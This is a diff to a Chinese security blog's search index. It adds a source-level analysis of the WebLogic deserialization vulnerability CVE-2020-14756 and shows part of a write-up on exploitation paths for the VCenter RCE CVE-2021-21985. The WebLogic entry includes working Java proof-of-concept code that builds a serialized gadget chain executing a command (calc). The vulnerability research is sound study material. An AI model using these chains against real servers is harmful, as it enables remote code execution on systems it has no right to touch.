@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Weblogic反序列化漏洞分析（CVE-2020-14756）]]></title>
+    <url>%2F%2Fblog%2F1625734346327.html</url>
+    <content type="text"><![CDATA[已有相关文章，就抄下作业。 先从 com.tangosol.util.ExternalizableHelper 开始，其 readObject 方法的入参是 DataInput 类的，最终会执行到 readObjectInternal 方法 当 nType 的值是 10 时，会执行 readExternalizableLite 方法： 而这个 nType 是根据反序列化对象的类来判断的： 进入 readExternalizableLite 方法，该方法中可以 loadclass,这个 class 是 ExternalizableLite 类，因为是二次反射，所以不经过黑名单的限制： 之后，调用到这个 class 的 readExternal 方法： 由于 Extractor 基本上都实现了 ExternalizableLite 这个接口，所以可以用 MvelExtractor 这个利用链，通过以 readExternal(DataInput in) 为 source，以 com.tangosol.util.extractor.AbstractExtractor#compare 为sink，作者找到了 TopNAggregator.PartialResult，该类也继承 ExternalizableLite: 且在 readExternal 中调用了自身的 add 方法，同时也注意到 this.m_comparator 也是通过 ExternalizableHelper.readObject 获得的，所以用之前的漏洞利用链 MvelExtractor 是可以的，在看 add 方法： 调用了 this.m_comparator.compare ，刚好接上利用链，同时为了不满足 this.size() &lt; this.m_cMaxSize 所以必须给 this.size() 一个值，跟进： 发现是在父类中，NavigableMap 的 size ，反射插入即可。 sink 解决了，在看 source ,因为 com.tangosol.util.ExternalizableHelper 的 readObject 方法的入参是 DataInput 类的，所以无法直接反序列化执行，现在需要找个类的 readExternal(ObjectInput in) 或者 readObject(ObjectInputStream in) 中有 ExternalizableHelper.readObject 且其对应的是 Object 而不是特定的类，这里找到了 com.tangosol.coherence.servlet.AttributeHolder: 这里还有个问题，就是 m_oValue 虽然是 Object 但是有 transient 修饰，按理来说不应该参加反序列化，但这里用的是 readExternal，而 transient 关键字只能与 Serializable 接口搭配使用 以上刚好构造好了整合利用链，相关代码：12345678910111213141516171819202122MvelExtractor extractor = new MvelExtractor("Runtime.getRuntime().exec(\"calc\");"); TopNAggregator.PartialResult partialResult = new TopNAggregator.PartialResult((Comparator)extractor, 1); NavigableMap&lt;Object, Object&gt; map = new TreeMap&lt;&gt;(); AttributeHolder attributeHolder = new AttributeHolder(); try &#123; Field field1 = SortedBag.class.getDeclaredField("m_map"); field1.setAccessible(true); map.put("1", "1"); field1.set(partialResult, map); Field field = AttributeHolder.class.getDeclaredField("m_oValue"); field.setAccessible(true); field.set(attributeHolder, partialResult); File f = new File("tmp.ser"); ObjectOutputStream obj = new ObjectOutputStream(new FileOutputStream(f)); obj.writeObject(attributeHolder); obj.close(); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; 在这个漏洞中，最重要的感觉还是 loadclass 这个点，其他基于这个点的 source 和 sink 都可以通过半自动化得到。]]></content>
+      <categories>
+        <category>漏洞分析</category>
+      </categories>
+      <tags>
+        <tag>Weblogic</tag>
+        <tag>Java</tag>
+        <tag>反序列化</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[VCenter Server RCE (CVE-2021-21985)]]></title>
     <url>%2F%2Fblog%2F1622788709768.html</url>
     <content type="text"><![CDATA[漏洞触发的原理比较直接，在 com.vmware.vsan.client.services.ProxygenController 中可以反射任意 bean 的任意方法： 主要是利用的问题，有公开了一个利用方法，学习一下，文章中的类和方法是 &amp;vsanProviderUtils_setVmodlHelper/ 和 setTargetObject，经过一通寻找，最终发现是和 org.springframework.beans.factory.config.MethodInvokingBean 等有关： 进该类看下，发现最终是继承 org.springframework.util.MethodInvoker 的，在其中有 setTargetObject、setTargetMethod、setTargetClass、setArguments、prepare 方法，设置反射所必需的条件，最后还有个 invoke 方法，可以调用任意类的任意静态方法 ： 非常完美，唯一有些遗憾的是必须是静态方法。在文章中使用的是 javax.naming.InitialContext.doLookup 进行 JNDI 利用，达到 RCE： 学习了这个利用链，可以作为 Spring bean RCE 的利用链之一。 之后又公开了另一种利用方式，在 com.vmware.vim.vmomi.core.types.impl.VmodContextImpl 类中的 loadVmodlPackage 方法： 其中 NonValidatingClassPathXmlApplicationContext 是继承 ClassPathXmlApplicationContext 并调用了其构造方法，导致的远程加载 xml 文件找造成 Spel RCE: （之前走马观花看到过这个类，给忽略了。。。居然没发现） 当然，文章中的回显思路也是很赞的，利用一个回显的 SSRF，返回 xml 内容，并利用 ClassPathXmlApplicationContext 解析，最后将结果放到 System Properties 存储，第二个请求，则将 System Properties 的内容输出，以达到回显的目的，盗一张图： 还有一种方法，这种方法和第一种方法的点是一样的，但是利用点不同，这是利用 org.eclipse.jdt.internal.compiler.parser.Parser类的 buildFileForTable 方法直接写 class： 然后使用 java.lang.System 的 load 方法调用该类（貌似这个类还不是普通的类）： 文中还有一种方法，使用 jdk.jfr.internal.Utils 类中的 writeGeneratedASM 方法写 class: 之前还需利用 java.lang.System.setProperty() 修改 SAVE_GENERATED 的值 最后是作者的 Github 学习了很多，点也不难，但是要找利用链，确实太耗时间了…]]></content>
@@ -9,8 +22,8 @@
       </categories>
       <tags>
         <tag>Java</tag>
-        <tag>姿势</tag>
         <tag>POC</tag>
+        <tag>姿势</tag>
       </tags>
   </entry>
   <entry>
